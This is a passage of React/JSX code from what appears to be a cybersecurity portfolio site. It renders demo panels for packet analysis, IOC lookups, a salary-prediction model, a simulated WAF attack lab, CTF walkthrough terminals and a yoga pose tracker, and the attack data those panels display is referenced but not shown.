                        <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 flex flex-col sm:flex-row items-center justify-between gap-4">
                          <div>
                            <h4 className="font-bold text-slate-100 flex items-center gap-2">
                              <Zap size={16} className="text-amber-400" />
                              Synthetic PCAP Replay Benchmark Engine (100k Packets)
                            </h4>
                            <p className="text-xs text-slate-400 mt-1">
                              Replays <code className="text-amber-400">test_pcaps/benchmark_100k.pcap</code> through the multi-threaded C++17 parser using lock-free std::atomic throughput counters.
                            </p>
                          </div>
                          <button
                            onClick={runBenchmark}
                            disabled={benchRunning}
                            className="px-5 py-2.5 rounded-xl bg-amber-500/20 border border-amber-500/40 text-amber-300 hover:bg-amber-500/30 font-mono text-xs font-bold transition-all flex items-center gap-2 shrink-0"
                          >
                            <Play size={13} className={benchRunning ? "animate-spin" : ""} />
                            {benchRunning ? "Parsing PCAP..." : "Run 100k Replay Benchmark →"}
                          </button>
                        </div>

                        {/* Gauges */}
                        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-center font-mono">
                          <div className="p-3 bg-slate-950 border border-slate-800 rounded-xl">
                            <p className="text-xs text-slate-500">Packets Ingested</p>
                            <p className="text-lg sm:text-xl font-extrabold text-amber-400">{benchStats.packets.toLocaleString()}</p>
                          </div>
                          <div className="p-3 bg-slate-950 border border-emerald-500/20 rounded-xl">
                            <p className="text-xs text-slate-500">Parsed Throughput</p>
                            <p className="text-lg sm:text-xl font-extrabold text-emerald-400">
                              {benchStats.pps.toLocaleString()} <span className="text-xs font-normal text-slate-400">pps</span>
                            </p>
                          </div>
                          <div className="p-3 bg-slate-950 border border-cyan-500/20 rounded-xl">
                            <p className="text-xs text-slate-500">Line Bandwidth</p>
                            <p className="text-lg sm:text-xl font-extrabold text-cyan-400">{benchStats.mbps} Mbps</p>
                          </div>
                          <div className="p-3 bg-slate-950 border border-slate-800 rounded-xl">
                            <p className="text-xs text-slate-500">Execution Time</p>
                            <p className="text-lg sm:text-xl font-extrabold text-slate-200">{benchStats.time}s</p>
                          </div>
                        </div>

                        {/* Protocol Breakdown */}
                        <div className="p-3.5 bg-slate-950 rounded-xl border border-slate-800 font-mono text-xs flex justify-around text-slate-400">
                          <span>TCP Packets: <strong className="text-emerald-400">{benchStats.tcp.toLocaleString()}</strong></span>
                          <span>UDP Packets: <strong className="text-cyan-400">{benchStats.udp.toLocaleString()}</strong></span>
                          <span>ICMP Packets: <strong className="text-purple-400">{benchStats.icmp}</strong></span>
                        </div>
                      </div>
                    )}

                    {/* Mode 2: WireMCP Deep Dissector */}
                    {wireMcpMode === "dissection" && (
                      <div className="space-y-3">
                        <div className="p-3.5 bg-slate-950 rounded-xl border border-slate-800">
                          <div className="flex items-center justify-between mb-2">
                            <span className="text-xs font-mono font-bold text-slate-300 flex items-center gap-1.5">
                              <Radio size={14} className="text-cyan-400" /> Dissect Frame from benchmark_100k.pcap:
                            </span>
                            <span className="text-[11px] font-mono text-slate-500">wiremcp::analyze_pcap inspector</span>
                          </div>
                          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                            {wireMcpSamplePackets.map((pkt) => (
                              <button
                                key={pkt.frame}
                                onClick={() => setSelectedWireFrame(pkt)}
                                className={`p-2 rounded-lg border text-left text-xs font-mono transition-all ${
                                  selectedWireFrame.frame === pkt.frame
                                    ? "bg-cyan-500/20 border-cyan-500/50 text-cyan-200 font-bold"
                                    : "bg-slate-900 border-slate-800 text-slate-400 hover:text-slate-200"
                                }`}
                              >
                                <div>Frame #{pkt.frame}</div>
                                <div className="text-[10px] text-slate-500">{pkt.proto}</div>
                              </button>
                            ))}
                          </div>
                        </div>

                        {/* Dissected Layer Stack */}
                        <div className="p-3.5 bg-slate-950 rounded-xl border border-slate-800 space-y-2 font-mono text-xs">
                          <div className="flex items-center justify-between pb-1.5 border-b border-slate-800/80">
                            <span className="text-slate-200 font-bold flex items-center gap-1.5">
                              <Layers size={13} className="text-emerald-400" /> Frame #{selectedWireFrame.frame} OSI Layer Dissection
                            </span>
                            <span className="text-slate-400 text-[11px]">{selectedWireFrame.len} bytes on wire</span>
                          </div>

                          <div className="space-y-1.5 text-[11px]">
                            <div className="p-2 rounded bg-slate-900/80 border border-slate-800 text-slate-300">
                              <span className="text-slate-500">[Layer 2] Ethernet II: </span>{selectedWireFrame.layers.ethernet}
                            </div>
                            <div className="p-2 rounded bg-slate-900/80 border border-slate-800 text-slate-300">
                              <span className="text-cyan-400">[Layer 3] IPv4 Header: </span>{selectedWireFrame.layers.ip}
                            </div>
                            {selectedWireFrame.layers.tcp && (
                              <div className="p-2 rounded bg-slate-900/80 border border-slate-800 text-slate-300">
                                <span className="text-emerald-400">[Layer 4] TCP Segment: </span>{selectedWireFrame.layers.tcp}
                              </div>
                            )}
                            {selectedWireFrame.layers.udp && (
                              <div className="p-2 rounded bg-slate-900/80 border border-slate-800 text-slate-300">
                                <span className="text-emerald-400">[Layer 4] UDP Datagram: </span>{selectedWireFrame.layers.udp}
                              </div>
                            )}
                            {selectedWireFrame.layers.tls && (
                              <div className="p-2 rounded bg-slate-900/80 border border-slate-800 text-amber-300">
                                <span className="text-amber-400">[Layer 7] TLS Handshake: </span>{selectedWireFrame.layers.tls}
                              </div>
                            )}
                            {selectedWireFrame.layers.dns && (
                              <div className="p-2 rounded bg-slate-900/80 border border-slate-800 text-cyan-300">
                                <span className="text-cyan-400">[Layer 7] DNS Query: </span>{selectedWireFrame.layers.dns}
                              </div>
                            )}
                            {selectedWireFrame.layers.threat && (
                              <div className="p-2 rounded bg-red-500/10 border border-red-500/30 text-red-300 font-bold">
                                ⚠️ {selectedWireFrame.layers.threat}
                              </div>
                            )}
                          </div>
                        </div>
                      </div>
                    )}

                    {/* Mode 3: WireMCP URLhaus IOC Threat Scanner */}
                    {wireMcpMode === "ioc_threat" && (
                      <div className="space-y-3 font-mono">
                        <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 space-y-3">
                          <div className="flex flex-wrap items-center justify-between gap-2">
                            <div>
                              <h4 className="font-bold text-slate-100 flex items-center gap-2">
                                <Bug size={16} className="text-red-400" />
                                WireMCP Threat Intelligence &amp; URLhaus Blacklist Scanner
                              </h4>
                              <p className="text-xs text-slate-400 mt-1">
                                Correlates extracted packet endpoints against 450,000+ active IOCs via <code className="text-red-400">wiremcp check_ip_threats</code>.
                              </p>
                            </div>
                          </div>

                          <div className="flex flex-wrap gap-2 items-center">
                            <span className="text-xs text-slate-400">Select Endpoint:</span>
                            {["8.8.8.8", "192.168.1.1", "103.145.13.208"].map((ip) => (
                              <button
                                key={ip}
                                onClick={() => handleScanWireMcpThreat(ip)}
                                className={`px-2.5 py-1 rounded-md text-xs border transition-all ${
                                  wireMcpSelectedIp === ip
                                    ? "bg-red-500/20 text-red-300 border-red-500/50 font-bold"
                                    : "bg-slate-900 text-slate-400 border-slate-800 hover:text-slate-200"
                                }`}
                              >
                                {ip} {ip === "103.145.13.208" && "⚠️ (Test C2)"}
                              </button>
                            ))}
                            <button
                              onClick={() => handleScanWireMcpThreat(wireMcpSelectedIp)}
                              disabled={wireMcpScanning}
                              className="ml-auto px-3 py-1.5 rounded-lg bg-red-500/20 border border-red-500/40 text-red-300 hover:bg-red-500/30 text-xs font-bold transition-all flex items-center gap-1.5"
                            >
                              <Search size={12} className={wireMcpScanning ? "animate-spin" : ""} />
                              {wireMcpScanning ? "Checking URLhaus API..." : "Check Threat Rep →"}
                            </button>
                          </div>
                        </div>

                        {/* Threat Result */}
                        <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 space-y-2 text-xs">
                          <div className="flex items-center justify-between">
                            <span className="text-slate-400 font-bold">Target IP: {wireMcpThreatResult.ip}</span>
                            <span className={`px-2.5 py-0.5 rounded font-bold ${wireMcpThreatResult.statusColor}`}>
                              {wireMcpThreatResult.verdict}
                            </span>
                          </div>
                          <p className="text-slate-300 text-[11px] leading-relaxed">
                            {wireMcpThreatResult.details}
                          </p>
                          <div className="text-[10px] text-slate-500 pt-1 border-t border-slate-800/80">
                            Detection Confidence: {wireMcpThreatResult.confidence} | Source: URLhaus Abuse.ch via WireMCP Plugin
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                )}

                {/* 4. EMPLOYEE SALARY PREDICTION ML SIMULATOR */}
                {isSalary && (
                  <div className="space-y-4">
                    <p className="text-xs text-slate-400">
                      Test live demographic inference against the Gradient Boosting model pipeline:
                    </p>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                      <div>
                        <label className="text-xs font-mono text-slate-400">Age: {mlAge}</label>
                        <input
                          type="range"
                          min="18"
                          max="70"
                          value={mlAge}
                          onChange={(e) => setMlAge(Number(e.target.value))}
                          className="w-full accent-cyan-400 mt-1"
                        />
                      </div>
                      <div>
                        <label className="text-xs font-mono text-slate-400">Weekly Hours: {mlHours}</label>
                        <input
                          type="range"
                          min="10"
                          max="80"
                          value={mlHours}
                          onChange={(e) => setMlHours(Number(e.target.value))}
                          className="w-full accent-cyan-400 mt-1"
                        />
                      </div>
                      <div>
                        <label className="text-xs font-mono text-slate-400">Education Level</label>
                        <select
                          value={mlEducation}
                          onChange={(e) => setMlEducation(e.target.value)}
                          className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs font-mono text-slate-200 mt-1"
                        >
                          <option value="HighSchool">High School</option>
                          <option value="SomeCollege">Some College</option>
                          <option value="Bachelors">Bachelors</option>
                          <option value="Masters">Masters / Doctorate</option>
                        </select>
                      </div>
                      <div>
                        <label className="text-xs font-mono text-slate-400">Workclass</label>
                        <select
                          value={mlWorkclass}
                          onChange={(e) => setMlWorkclass(e.target.value)}
                          className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs font-mono text-slate-200 mt-1"
                        >
                          <option value="Private">Private Enterprise</option>
                          <option value="SelfEmployed">Self-Employed</option>
                          <option value="Government">Federal / State Gov</option>
                        </select>
                      </div>
                    </div>

                    <button
                      onClick={handlePredictSalary}
                      className="w-full py-2.5 rounded-xl bg-cyan-500/20 border border-cyan-500/40 text-cyan-300 font-mono text-xs font-bold hover:bg-cyan-500/30 transition-all"
                    >
                      Compute Microservice Inference →
                    </button>

                    <div className="p-3 bg-slate-950 rounded-xl border border-cyan-500/30 text-center font-mono text-xs">
                      <span className="text-slate-400">Model Prediction: </span>
                      <strong className="text-cyan-300 text-sm">{mlResult}</strong>
                    </div>
                  </div>
                )}

                {/* 5. FINANCIAL THREAT PLATFORM & OWASP WEB SECURITY LAB */}
                {isFinance && (
                  <div className="space-y-4">
                    <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 space-y-3">
                      <div className="flex flex-wrap items-center justify-between gap-2">
                        <span className="text-xs font-mono text-cyan-400 font-bold flex items-center gap-1.5">
                          <ShieldAlert size={14} /> Select Adversary Pentest Attack Vector:
                        </span>
                        <span className="text-[11px] font-mono text-slate-500">Cloudflare WAF + Spring Security</span>
                      </div>

                      <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                        {Object.keys(financeScenarios).map((key) => (
                          <button
                            key={key}
                            onClick={() => setFinanceAttack(key)}
                            className={`p-2 rounded-lg border text-xs font-mono transition-all text-left ${
                              financeAttack === key
                                ? "bg-cyan-500/20 text-cyan-300 border-cyan-400 font-bold"
                                : "bg-slate-900 text-slate-400 border-slate-800 hover:text-slate-200"
                            }`}
                          >
                            {financeScenarios[key].title}
                          </button>
                        ))}
                      </div>

                      {/* Request Details */}
                      <div className="space-y-2 pt-2 border-t border-slate-800/80 font-mono text-xs">
                        <div className="flex items-center justify-between text-[11px]">
                          <span className="text-slate-400">Target Endpoint: <code className="text-cyan-300">{financeScenarios[financeAttack].endpoint}</code></span>
                          <span className="text-slate-400">Defense: <strong className="text-emerald-400">{financeScenarios[financeAttack].defense}</strong></span>
                        </div>
                        <div className="p-2.5 bg-black/60 rounded border border-slate-800 text-[11px] text-amber-300 overflow-x-auto whitespace-pre">
                          {financeScenarios[financeAttack].payload}
                        </div>
                      </div>

                      {/* Launch Attack Button */}
                      <button
                        onClick={() => {
                          setFinanceTesting(true);
                          setTimeout(() => setFinanceTesting(false), 600);
                        }}
                        disabled={financeTesting}
                        className="w-full py-2 rounded-lg bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 hover:bg-emerald-500/30 font-mono text-xs font-bold transition-all flex items-center justify-center gap-2"
                      >
                        <Zap size={13} className={financeTesting ? "animate-spin" : ""} />
                        {financeTesting ? "Simulating Web Security Interception..." : "Launch Adversary Exploit Request →"}
                      </button>
                    </div>

                    {/* Defense & WAF Intercept Output */}
                    <div className="p-3.5 bg-black/80 rounded-xl border border-slate-800 space-y-2 font-mono text-xs">
                      <div className="flex items-center justify-between">
                        <span className="text-slate-300 font-bold flex items-center gap-1.5">
                          <ShieldCheck size={14} className="text-emerald-400" /> WAF Defense Verdict:
                        </span>
                        <span className={`px-2.5 py-0.5 rounded font-bold text-[11px] ${financeScenarios[financeAttack].statusColor}`}>
                          {financeScenarios[financeAttack].status}
                        </span>
                      </div>
                      <div className="p-3 bg-slate-950 rounded border border-slate-800/80 text-[11px] text-emerald-300 overflow-x-auto whitespace-pre leading-relaxed">
                        {financeScenarios[financeAttack].log}
                      </div>
                    </div>
                  </div>
                )}

                {/* 6. CYBERLAB & CONFESSIONS: INTERACTIVE CTF TERMINAL */}
                {(isCyberlab || isConfessions) && (
                  <div className="space-y-4">
                    {/* CTF Room Selection */}
                    <div className="p-3.5 bg-slate-950 rounded-xl border border-slate-800 flex flex-wrap items-center justify-between gap-3">
                      <div className="flex items-center gap-2">
                        <Terminal size={16} className="text-cyan-400" />
                        <span className="text-xs font-mono font-bold text-slate-200">Select CTF Exploitation Playbook:</span>
                      </div>
                      <div className="flex flex-wrap gap-2">
                        {Object.keys(ctfPlaybooks).map((key) => (
                          <button
                            key={key}
                            onClick={() => {
                              setCtfRoom(key);
                              setCtfStep(0);
                            }}
                            className={`px-3 py-1.5 rounded-lg text-xs font-mono border transition-all ${
                              ctfRoom === key
                                ? "bg-cyan-500/20 text-cyan-300 border-cyan-400 font-bold"
                                : "bg-slate-900 text-slate-400 border-slate-800 hover:text-slate-200"
                            }`}
                          >
                            {key === "mr_robot" ? "🎯 Mr. Robot" : key === "eternal_blue" ? "🔵 Blue (MS17-010)" : "🧊 Icecast (PrivEsc)"}
                          </button>
                        ))}
                      </div>
                    </div>

                    {/* Active Playbook Header */}
                    <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 flex flex-wrap items-center justify-between gap-2">
                      <div>
                        <h4 className="font-bold text-slate-100 flex items-center gap-2 text-sm">
                          {ctfPlaybooks[ctfRoom].title}
                        </h4>
                        <p className="text-xs font-mono text-slate-400 mt-0.5">
                          Target Host: <code className="text-cyan-300">{ctfPlaybooks[ctfRoom].target}</code>
                        </p>
                      </div>
                      <div className="flex items-center gap-2">
                        <span className="text-xs font-mono text-slate-400">Phase:</span>
                        {ctfPlaybooks[ctfRoom].steps.map((_, idx) => (
                          <button
                            key={idx}
                            onClick={() => setCtfStep(idx)}
                            className={`w-7 h-7 rounded-lg text-xs font-mono font-bold border transition-all flex items-center justify-center ${
                              ctfStep === idx
                                ? "bg-emerald-500/20 text-emerald-300 border-emerald-400"
                                : "bg-slate-900 text-slate-500 border-slate-800 hover:text-slate-300"
                            }`}
                          >
                            {idx + 1}
                          </button>
                        ))}
                      </div>
                    </div>

                    {/* Interactive Kali Terminal Window */}
                    <div className="rounded-xl border border-slate-800 bg-black/90 overflow-hidden font-mono shadow-2xl">
                      {/* Terminal Title Bar */}
                      <div className="flex items-center justify-between px-4 py-2.5 bg-slate-950 border-b border-slate-800 text-xs">
                        <div className="flex items-center gap-2">
                          <span className="w-2.5 h-2.5 rounded-full bg-red-500/80" />
                          <span className="w-2.5 h-2.5 rounded-full bg-amber-500/80" />
                          <span className="w-2.5 h-2.5 rounded-full bg-emerald-500/80" />
                          <span className="ml-2 text-slate-400 text-[11px]">parth@cyberlab:~ (TryHackMe AttackBox)</span>
                        </div>
                        <span className="text-slate-500 text-[11px]">Phase {ctfStep + 1} of {ctfPlaybooks[ctfRoom].steps.length}</span>
                      </div>

                      {/* Command & Output */}
                      <div className="p-4 space-y-3 text-xs">
                        <div className="flex items-center gap-2 text-cyan-400">
                          <span className="text-emerald-400 font-bold">parth@cyberlab:~$</span>
                          <span className="text-slate-100 font-bold">{ctfPlaybooks[ctfRoom].steps[ctfStep].cmd}</span>
                        </div>
                        <div className="p-3 bg-slate-950/80 rounded border border-slate-800 text-[11px] text-emerald-300 overflow-x-auto whitespace-pre leading-relaxed">
                          {ctfPlaybooks[ctfRoom].steps[ctfStep].output}
                        </div>
                        <div className="p-2.5 rounded bg-cyan-500/10 border border-cyan-500/20 text-cyan-300 text-[11px] flex items-center gap-2">
                          <CheckCircle2 size={13} className="shrink-0 text-cyan-400" />
                          <span><strong>Mitigation / Insight:</strong> {ctfPlaybooks[ctfRoom].steps[ctfStep].note}</span>
                        </div>
                      </div>

                      {/* Terminal Footer Controls */}
                      <div className="px-4 py-2.5 bg-slate-950/60 border-t border-slate-800/80 flex items-center justify-between text-xs">
                        <button
                          onClick={() => setCtfStep((prev) => Math.max(0, prev - 1))}
                          disabled={ctfStep === 0}
                          className="px-3 py-1 rounded bg-slate-900 border border-slate-800 text-slate-400 hover:text-slate-200 disabled:opacity-40 transition-all"
                        >
                          ← Previous Phase
                        </button>
                        <button
                          onClick={() => setCtfStep((prev) => Math.min(ctfPlaybooks[ctfRoom].steps.length - 1, prev + 1))}
                          disabled={ctfStep === ctfPlaybooks[ctfRoom].steps.length - 1}
                          className="px-3 py-1 rounded bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 hover:bg-emerald-500/30 disabled:opacity-40 transition-all font-bold"
                        >
                          Execute Next Phase →
                        </button>
                      </div>
                    </div>
                  </div>
                )}

                {/* 7. AI YOGA GURU: COMPUTER VISION KINEMATICS */}
                {isYoga && (
                  <div className="space-y-4">
                    <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 space-y-3">
                      <div className="flex flex-wrap items-center justify-between gap-2">
                        <h4 className="font-bold text-slate-100 flex items-center gap-2">
                          <Activity size={16} className="text-emerald-400" />
                          Real-Time Biomechanical Pose Estimator &amp; Kinematics Tracker
                        </h4>
                        <div className="flex gap-2">
                          {Object.keys(yogaScenarios).map((pose) => (
                            <button
                              key={pose}
                              onClick={() => setYogaPose(pose)}
                              className={`px-3 py-1 rounded-lg text-xs font-mono border transition-all ${
                                yogaPose === pose
                                  ? "bg-emerald-500/20 text-emerald-300 border-emerald-400 font-bold"
                                  : "bg-slate-900 text-slate-400 border-slate-800 hover:text-slate-200"
                              }`}
                            >
                              {yogaScenarios[pose].name.split("(")[0]}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Biomechanical Telemetry Meters */}
                      <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 font-mono text-xs">
                        <div className="p-3 bg-slate-900 rounded-xl border border-slate-800">
                          <p className="text-slate-500 text-[11px]">Knee Angle Degree</p>
                          <p className="text-base font-bold text-emerald-400 mt-1">{yogaScenarios[yogaPose].kneeAngle}</p>
                        </div>
                        <div className="p-3 bg-slate-900 rounded-xl border border-slate-800">
                          <p className="text-slate-500 text-[11px]">Spine Alignment</p>
                          <p className="text-base font-bold text-cyan-400 mt-1">{yogaScenarios[yogaPose].spineAlign}</p>
                        </div>
                        <div className="p-3 bg-slate-900 rounded-xl border border-slate-800">
                          <p className="text-slate-500 text-[11px]">Arm Span Vector</p>
                          <p className="text-base font-bold text-amber-400 mt-1">{yogaScenarios[yogaPose].armSpan}</p>
                        </div>
                      </div>

                      {/* AI Posture Feedback */}
                      <div className="p-3.5 bg-slate-900/80 rounded-xl border border-slate-800 space-y-2">
                        <div className="flex items-center justify-between text-xs font-mono">
                          <span className="text-slate-300 font-bold">Gemini AI Correction Coach:</span>
                          <span className={`px-2 py-0.5 rounded text-[11px] font-bold ${yogaScenarios[yogaPose].statusColor}`}>
                            {yogaScenarios[yogaPose].status}
                          </span>
                        </div>
                        <p className="text-xs text-slate-300 leading-relaxed font-mono">
                          💡 {yogaScenarios[yogaPose].feedback}
                        </p>
                      </div>
                    </div>
                  </div>
                )}

                {/* 8. GENERAL APPLICATION RUNTIME DIAGNOSTICS (FALLBACK FOR OTHER PROJECTS - NEVER RENDERS 3D HERE) */}
                {!isSocLab && !isFirewall && !isPacket && !isSalary && !isFinance && !isCyberlab && !isConfessions && !isYoga && (
                  <div className="space-y-4">
                    <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 space-y-3">
                      <div className="flex items-center justify-between">
                        <h4 className="font-bold text-slate-100 flex items-center gap-2">
                          <Activity size={16} className="text-emerald-400" />
                          Interactive Runtime Diagnostics &amp; Health Telemetry
                        </h4>
                        <span className="text-xs font-mono text-emerald-400 bg-emerald-500/10 border border-emerald-500/30 px-2 py-0.5 rounded">
                          ALL SYSTEMS OPERATIONAL
                        </span>
                      </div>
                      <p className="text-xs text-slate-400 leading-relaxed">
                        {project.description}
                      </p>

                      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs font-mono pt-2">
                        <div className="p-3 bg-slate-900 rounded-xl border border-slate-800">
                          <span className="text-slate-500">API Gateway</span>
                          <p className="text-emerald-400 font-bold mt-1">200 OK (18ms)</p>
                        </div>
                        <div className="p-3 bg-slate-900 rounded-xl border border-slate-800">
                          <span className="text-slate-500">Database Pool</span>
                          <p className="text-cyan-400 font-bold mt-1">Active (8/50)</p>
                        </div>
                        <div className="p-3 bg-slate-900 rounded-xl border border-slate-800">
                          <span className="text-slate-500">Docker Health</span>
                          <p className="text-emerald-400 font-bold mt-1">Healthy (0 restart)</p>
                        </div>
                        <div className="p-3 bg-slate-900 rounded-xl border border-slate-800">
                          <span className="text-slate-500">Memory Footprint</span>
                          <p className="text-amber-400 font-bold mt-1">64.2 MB / 512 MB</p>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            ) : (
              /* ARCHITECTURE & 3D TOPOLOGY TAB */
              <div className="space-y-4">
                <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <h4 className="text-sm font-bold text-slate-100 font-mono uppercase tracking-wider text-emerald-400 flex items-center gap-2">
                      <Zap size={14} className="text-emerald-400" />
                      3D Interactive Network Topology &amp; Attack Simulation
                    </h4>
                    <span className="text-[11px] font-mono text-cyan-400 bg-cyan-500/10 border border-cyan-500/30 px-2 py-0.5 rounded">
                      Live Isometric Model
                    </span>
                  </div>
                  <p className="text-xs text-slate-400 leading-relaxed">
                    Interactive simulation of the enterprise perimeter, DMZ segmentation, stateful firewall inspection, and corporate Active Directory core.
                  </p>
                </div>

                {/* Live 3D Modeling Visualizer for this Project */}
                <Project3DVisualizer defaultProject={project3dType} />

                <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 space-y-2">
                  <h5 className="text-xs font-mono font-bold text-slate-300">Target Hardening &amp; Compliance Standards</h5>
                  <div className="flex flex-wrap gap-2">
                    {project.tags.map((tag, i) => (
                      <span key={i} className="px-2.5 py-1 rounded bg-slate-800/60 border border-slate-700 text-xs font-mono text-slate-300">
                        {tag}
                      </span>
                    ))}
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Modal Footer with Direct External Links */}
          <div className="flex flex-wrap items-center justify-between p-4 border-t border-slate-800 bg-slate-950/80 gap-3">
            <div className="flex items-center gap-2">
              <a
                href={project.github}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-mono transition-colors"
              >
                <GithubIcon size={14} /> View Code on GitHub →
              </a>

              <a
                href="https://tryhackme.com/p/parthrspandey25"
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-300 hover:bg-rose-500/20 text-xs font-mono transition-colors"
                title="Parth Pandey TryHackMe Profile (Top 2% Global)"
              >
                <TryhackmeIcon size={14} /> TryHackMe [Top 2%]
              </a>
            </div>

            {project.articleUrl && (
              <a
                href={project.articleUrl}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-1.5 px-4 py-2 rounded-xl bg-gradient-to-r from-emerald-500/20 to-cyan-500/20 border border-emerald-500/30 text-emerald-300 hover:from-emerald-500/30 hover:to-cyan-500/30 text-xs font-mono font-semibold transition-all"
              >
                <ExternalLink size={14} /> {project.articleLabel || "Open Live Resource →"}
              </a>
            )}
          </div>
        </motion.div>
      </div>
    </AnimatePresence>
  );
}
